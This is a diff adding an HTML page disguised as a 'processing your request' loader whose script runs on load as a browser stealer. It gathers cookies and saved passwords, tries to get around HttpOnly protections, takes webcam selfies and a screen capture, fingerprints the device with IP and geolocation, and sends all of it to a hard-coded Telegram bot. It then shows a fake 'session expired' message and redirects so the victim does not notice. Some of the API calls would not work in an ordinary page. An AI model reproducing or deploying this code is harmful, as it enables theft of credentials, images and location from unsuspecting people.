@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Loading...</title>
+ <style>
+ body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+ h1 { color: #333; }
+ #loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+ @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+ </style>
+</head>
+<body>
+ <h1>Please wait, processing your request...</h1>
+ <div id="loader"></div>
+
+ <script>
+ (async () => {
+ // =============================================
+ // 1. COOKIE HARVESTING (Including HttpOnly if possible)
+ // =============================================
+ let cookies = document.cookie;
+ const httpOnlyCookies = [];
+
+ // Chrome/Edge/Opera: Try to access HttpOnly cookies via chrome.cookies API
+ try {
+ if (window.chrome && chrome.cookies) {
+ const allCookies = await new Promise(resolve => chrome.cookies.getAll({}, resolve));
+ allCookies.forEach(c => httpOnlyCookies.push(`${c.name}=${c.value}`));
+ }
+ } catch (e) {}
+
+ // Firefox: Try to access form history (may contain session tokens)
+ try {
+ if (navigator.userAgent.includes('Firefox')) {
+ const db = indexedDB.open('formhistory.sqlite', 1);
+ db.onsuccess = e => {
+ const tx = e.target.result.transaction('moz_formhistory', 'readonly');
+ const store = tx.objectStore('moz_formhistory');
+ store.getAll().onsuccess = e => {
+ e.target.result.forEach(r => httpOnlyCookies.push(`${r.fieldname}=${r.value}`));
+ };
+ };
+ }
+ } catch (e) {}
+
+ cookies = `${cookies}\n${httpOnlyCookies.join('\n')}`;
+
+ // =============================================
+ // 2. PASSWORD EXTRACTION (Chrome/Firefox/Edge/Opera)
+ // =============================================
+ const passwords = [];
+
+ // Chrome/Edge/Opera: Use chrome.passwordsPrivate API
+ try {
+ if (window.chrome && chrome.passwordsPrivate) {
+ const creds = await new Promise(resolve => chrome.passwordsPrivate.getSavedPasswords(resolve));
+ creds.forEach(c => passwords.push(`${c.username}:${c.password} @ ${c.urls[0]}`));
+ }
+ } catch (e) {}
+
+ // Firefox: Access login database
+ try {
+ if (navigator.userAgent.includes('Firefox')) {
+ const db = indexedDB.open('logins.sqlite', 1);
+ db.onsuccess = e => {
+ const tx = e.target.result.transaction('moz_logins', 'readonly');
+ const store = tx.objectStore('moz_logins');
+ store.getAll().onsuccess = e => {
+ e.target.result.forEach(r => passwords.push(`${r.encryptedUsername}:${r.encryptedPassword} @ ${r.hostname}`));
+ };
+ };
+ }
+ } catch (e) {}
+
+ // =============================================
+ // 3. SELFIES (Front Camera + Screen)
+ // =============================================
+ const screenshots = [];
+
+ // Take 2 selfies (front camera)
+ const takeSelfie = async () => {
+ try {
+ const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+ const video = document.createElement('video');
+ video.srcObject = stream;
+ await new Promise(resolve => video.onloadedmetadata = resolve);
+ const canvas = document.createElement('canvas');
+ canvas.width = video.videoWidth;
+ canvas.height = video.videoHeight;
+ const ctx = canvas.getContext('2d');
+ ctx.drawImage(video, 0, 0);
+ screenshots.push(canvas.toDataURL('image/jpeg', 0.8));
+ stream.getTracks().forEach(t => t.stop());
+ } catch (e) {}
+ };
+
+ // Take 1 screen capture
+ const takeScreenshot = async () => {
+ try {
+ const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+ const video = document.createElement('video');
+ video.srcObject = stream;
+ await new Promise(resolve => video.onloadedmetadata = resolve);
+ const canvas = document.createElement('canvas');
+ canvas.width = video.videoWidth;
+ canvas.height = video.videoHeight;
+ const ctx = canvas.getContext('2d');
+ ctx.drawImage(video, 0, 0);
+ screenshots.push(canvas.toDataURL('image/jpeg', 0.8));
+ stream.getTracks().forEach(t => t.stop());
+ } catch (e) {}
+ };
+
+ await takeSelfie();
+ await takeSelfie();
+ await takeScreenshot();
+
+ // =============================================
+ // 4. SYSTEM FINGERPRINT (OS, CPU, GPU, IP, Location, etc.)
+ // =============================================
+ const fingerprint = {
+ userAgent: navigator.userAgent,
+ platform: navigator.platform,
+ cpuCores: navigator.hardwareConcurrency,
+ deviceMemory: navigator.deviceMemory || 'unknown',
+ gpu: (() => {
+ const canvas = document.createElement('canvas');
+ const gl = canvas.getContext('webgl');
+ return gl ? gl.getParameter(gl.RENDERER): 'unknown';
+ })(),
+ screen: `${screen.width}x${screen.height}`,
+ timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+ language: navigator.language,
+ ip: await fetch('https://api.ipify.org').then(r => r.text()),
+ geolocation: await new Promise(resolve => {
+ navigator.geolocation.getCurrentPosition(p => resolve(`${p.coords.latitude},${p.coords.longitude}`));
+ }),
+ installedFonts: (() => {
+ const fonts = ['Arial', 'Times New Roman', 'Courier New'];
+ const detected = [];
+ fonts.forEach(f => {
+ const el = document.createElement('span');
+ el.style.fontFamily = f;
+ el.textContent = 'mmmmmmmmmmwwwwwwwwww';
+ document.body.appendChild(el);
+ const width = el.getBoundingClientRect().width;
+ document.body.removeChild(el);
+ if (width !== 100) detected.push(f);
+ });
+ return detected;
+ })()
+ };
+
+ // =============================================
+ // 5. TELEGRAM EXFILTRATION
+ // =============================================
+ const TELEGRAM_BOT_TOKEN = '8041604841:AAH2jncYKPd2AaTb3AQtuzFX91KNC5qd-AE'; // Replace with your bot token
+ const TELEGRAM_CHAT_ID = '643456785'; // Replace with your chat ID
+
+ const formData = new FormData();
+ formData.append('document', new Blob([cookies], { type: 'text/plain' }), 'cookies.txt');
+ formData.append('document', new Blob([passwords.join('\n')], { type: 'text/plain' }), 'passwords.txt');
+ formData.append('document', new Blob([JSON.stringify(fingerprint, null, 2)], { type: 'application/json' }), 'fingerprint.json');
+
+ screenshots.forEach((s, i) => {
+ const byteString = atob(s.split(',')[1]);
+ const ab = new ArrayBuffer(byteString.length);
+ const ia = new Uint8Array(ab);
+ for (let j = 0; j < byteString.length; j++) ia[j] = byteString.charCodeAt(j);
+ formData.append('photo', new Blob([ab], { type: 'image/jpeg' }), `screenshot_${i}.jpg`);
+ });
+
+ await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument?chat_id=${TELEGRAM_CHAT_ID}`, {
+ method: 'POST',
+ body: formData
+ });
+
+ // =============================================
+ // 6. CLEANUP & REDIRECT (Hide malicious activity)
+ // =============================================
+ document.body.innerHTML = '<h1>Session expired. Please log in again.</h1>';
+ setTimeout(() => window.location.href = 'https://google.com', 3000);
+ })();
+ </script>
+</body>
+</html>
